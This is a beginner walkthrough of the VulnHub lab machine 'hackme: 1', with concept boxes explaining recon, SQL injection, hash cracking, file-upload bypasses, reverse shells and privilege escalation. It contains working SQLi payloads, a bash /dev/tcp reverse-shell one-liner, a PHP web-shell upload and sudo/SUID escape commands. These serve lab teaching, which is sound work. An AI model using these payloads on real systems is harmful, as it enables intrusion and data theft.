# hackme: 1 — VulnHub Walkthrough (Beginner Friendly)

> **Authorized lab use only.** Run this machine inside an isolated virtual network
> (VirtualBox/VMware *host-only* adaptor). Never attack systems you do not own or
> have written permission to test.

| Field | Value |
| --- | --- |
| **Machine** | hackme: 1 |
| **Difficulty** | Easy |
| **Author** | x4bx54 |
| **Released** | 18 Jul 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/hackme-1,330/> |
| **Download** | <https://download.vulnhub.com/hackme/hackme.ova> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) on VirtualBox, host-only network |
| **Target OS** | Linux (Ubuntu 18.04) |

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

This is a **beginner** machine (the author calls it "beginner difficulty"). By the
end you will have practised the full, real-world chain:

- Discovering a host and its open ports on an isolated lab network.
- Enumerating a small PHP web application and finding hidden pages.
- Exploiting a **SQL injection** to dump a database (manually in the browser, and
  optionally with `sqlmap`).
- Cracking a weak **unsalted MD5** password hash and re-using the credential.
- Turning an **unrestricted file upload** into a PHP reverse shell.
- Escalating to `root` by abusing a **SUID binary**.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import an `.ova`, and have both VMs on the same host-only network.

> **Note on flags:** hackme: 1 does **not** ship `user.txt`/`root.txt` flag files.
> The objective is simply to reach a `root` shell. Don't be confused if your
> `find / -name "*.txt"` searches come up empty — that is by design.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# Identify your own IP + subnet first (the "eth0" adapter is the lab NIC)
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:4b:1a:2c brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
       valid_lft forever preferred_lft forever
```

> **How to read it:** Kali's lab interface usually holds a `192.168.56.x`
> (VirtualBox host-only) or `192.168.19x.x` (VMware) address. The target will
> live on the **same** subnet.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# ARP-scan the subnet to list live hosts (fast, uses ARP not TCP)
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:4b:1a:2c, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.100  08:00:27:ab:cd:ef       PCS Systemtechnik GmbH
192.168.56.101  08:00:27:11:22:33       PCS Systemtechnik GmbH
3 packets received by filter, 0 packets dropped by kernel
```

```bash
# If arp-scan is unavailable, netdiscover does the same job
sudo netdiscover -r 192.168.56.0/24
```

![arp scan showing the target host](images/01-recon.png)

**Target IP:** `192.168.56.101`

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
# Fast full-TCP port sweep, then service/version detection on the open ports
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: hackme
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:**
> - `-p-` scans all 65,535 TCP ports.
> - `-sV` guesses the **service and version** behind each open port.
> - `-sC` runs Nmap's default scripts (banners, safe checks).
> - Note every open port — each one is an *attack surface*. Here: SSH (22) and a
>   web server (80).

Now enumerate the web server for hidden files and directories:


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
# (dirb or ffuf work just as well)
```

```text
/index.php           (Status: 200) [Size: 768]
/login.php           (Status: 200) [Size: 1052]
/register.php        (Status: 200) [Size: 1288]
/welcome.php         (Status: 200) [Size: 1420]
/uploads/            (Status: 301) [Size: 315]  --> http://192.168.56.101/uploads/
```

![nmap and directory scan output](images/02-nmap.png)

> **Why it matters:** `/login.php` plus `/register.php` means we can **create our
> own account**. `uploads/` hints that the app lets users store files — a classic
> file-upload weakness. And `welcome.php` is the page you reach **after** logging
> in, so it is where the interesting application logic lives.

---

## 3. Foothold — gaining the first shell

### 3.1 Create an account and log in

Browse to `http://192.168.56.101/register.php` and register a throwaway user
(e.g. `student` / `student123`), then log in at `login.php`.

> **Why it works:** the app is only gated by a login, and it lets *anyone* sign
> up. Signing up is not the vulnerability by itself — it simply unlocks the search
> feature on `welcome.php`, which *is* the vulnerable code.

### 3.2 Find the SQL injection

`welcome.php` has a search box that looks up "books". Type a single quote `'`
into it.

```text
Search results
You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near ''%'' at line 1
```

> **Why it works:** that database error means our `'` broke out of the SQL string
> and changed the query. That is **SQL injection**. The search value is dropped
> straight into a query such as
> `SELECT * FROM books WHERE title LIKE '%<our input>%'`.

Establish how many columns the query returns with `ORDER BY`:

```sql
' ORDER BY 3 #          -- works (3 columns exist)
' ORDER BY 4 #          -- error (there is no 4th column)
```

Then use a `UNION SELECT` to print our own values in the page:


> ### 📖 Concept — What is SQL injection?
>
> The application builds a query by **concatenating your input**:
>
> ```php
> $q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
> ```
>
> Supply `admin' -- ` and it becomes:
>
> ```sql
> SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
> ```
>
> `-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
> password check is deleted and you are logged in as admin with no password. Your
> input escaped the *data* context and became *code*.
>
> **Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a database
> error, a changed page length, or a different status code.
>
> **Payload shapes:**
>
> ```text
> ' OR 1=1 --                        tautology
> ' OR '1'='1                        string-context tautology
> 1' UNION SELECT 1,2,3 --           find the column count, then extract data
> 1' UNION SELECT user_login,user_pass,3 FROM wp_users --
> '; WAITFOR DELAY '0:0:5' --        blind/time-based confirmation
> ```
>
> ```bash
> sqlmap -u "http://target/page.php?id=1" --dbs
> sqlmap -u "http://target/page.php?id=1" -D wordpress -T wp_users --dump
> sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
> ```
>
> > **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> > reason is usually that you have not told it *where* the injectable parameter is,
> > that authentication is needed (`--cookie=`), or that the injection is
> > second-order. Confirm manually with a `'` first — it takes ten seconds and tells
> > you whether sqlmap has anything to work with.
>
> The fix is always the same: **prepared statements / bound parameters**, never string
> concatenation.
>
> **Deep dive:** [CONCEPTS §13.1 — SQL injection](../../docs/CONCEPTS.md#131-sql-injection-sqli)

```sql
' UNION SELECT 1, user(), database() #
```

```text
Search results
1    root@localhost     webapphacking
```

Now dump the `users` table (the database is `webapphacking`, the table is `users`):

```sql
' UNION SELECT 1, username, password FROM users #
```

```text
Search results
1    admin        21232f297a57a5a743894a0e4a801fc3
1    superadmin   2386acb2cf356944177746fc92523983
```

> **Why it works:** because the whole query result is printed into the HTML table,
> any columns we `UNION SELECT` become visible. We chose the `users` table because
> `database()` told us where to look, and the columns `username`/`password` are the
> obvious credential pair. (On your build the usernames and hashes will be the same
> shape but read the values live — see the note below.)

**Optional — automate with sqlmap.** Copy your `PHPSESSID` cookie from the browser
(login is required first), then:

```bash
sqlmap -u "http://192.168.56.101/welcome.php" \
  --data="search=test" \
  --cookie="PHPSESSID=<your-session-id>" \
  --batch --dbs --dump
```

```text
available databases [2]:
[*] information_schema
[*] webapphacking

Database: webapphacking
Table: users
[2 entries]
+-----------+----------------------------------+
| username  | password                         |
+-----------+----------------------------------+
| admin     | 21232f297a57a5a743894a0e4a801fc3 |
| superadmin| 2386acb2cf356944177746fc92523983 |
+-----------+----------------------------------+
```

### 3.3 Crack the hash

`2386acb2cf356944177746fc92523983` is a 32-character hex string: an **unsalted
MD5** hash. Paste it into an online lookup like
[CrackStation](https://crackstation.net/) (or crack it locally):


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
# Save the hash, then crack it with hashcat (mode 0 = raw MD5)
echo "2386acb2cf356944177746fc92523983" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 hash.txt --show
```

```text
2386acb2cf356944177746fc92523983:<cracked-password>
```

> **Why it works:** unsalted MD5 of a weak dictionary word is instantly reversible
> with a wordlist. `<cracked-password>` is a short, common password — crack it on
> your own instance to see the exact value. This is exactly why strong hashing
> (bcrypt/argon2 + salt) and strong passwords matter.

![SQL injection dumping the users table](images/03-enum.png)

### 3.4 Log in as an administrator

Log back in at `login.php` as `superadmin` with the cracked password. You are now
redirected to `welcomeadmin.php`, an admin page that includes a **file upload**
feature.

### 3.5 The reverse shell

The upload accepts a `.php` file, so we upload a PHP reverse shell instead of an
image.


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# 1) On Kali, start a listener
nc -lvnp 4444

# 2) Copy the pentestmonkey PHP reverse shell and edit the callback IP/port
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
#   set $ip   = '192.168.56.10';   (your Kali IP)
#   set $port = 4444;
```

Upload `shell.php` through the admin page, then trigger it in the browser (the
app stores it under `/uploads/`):

```bash
# Request the uploaded shell — it connects back to our nc listener
curl http://192.168.56.101/uploads/shell.php
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 42318
Linux hackme 4.15.0-... #1 SMP ... x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** a web server only runs the files you *ask it to run*. By
> storing a `.php` file inside the web root and then requesting it, the Apache/PHP
> engine executes our code **as the `www-data` user** — a remote shell.

Upgrade the dumb shell to a fully interactive one:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then press Ctrl+Z, and on your Kali terminal run:
stty raw -echo; fg
# then press Enter twice, and inside the target shell:
export TERM=xterm
```

![The reverse shell as www-data](images/04-foothold.png)
![Shell as www-data](images/05-shell.png)

> **Flags:** there are no flag files on this box — proceed straight to privilege
> escalation.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

Run the standard quick checks:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)
> ### 📖 Concept — Cron jobs, and pspy for the ones you cannot see
>
> **cron** runs commands on a schedule. Jobs may be defined per-user
> (`crontab -l`), system-wide (`/etc/crontab`), or as drop-ins (`/etc/cron.d/`,
> `/etc/cron.{hourly,daily,weekly,monthly}/`).
>
> ```bash
> cat /etc/crontab
> ls -la /etc/cron.*
> crontab -l
> ls -la /var/spool/cron/crontabs/
> ```
>
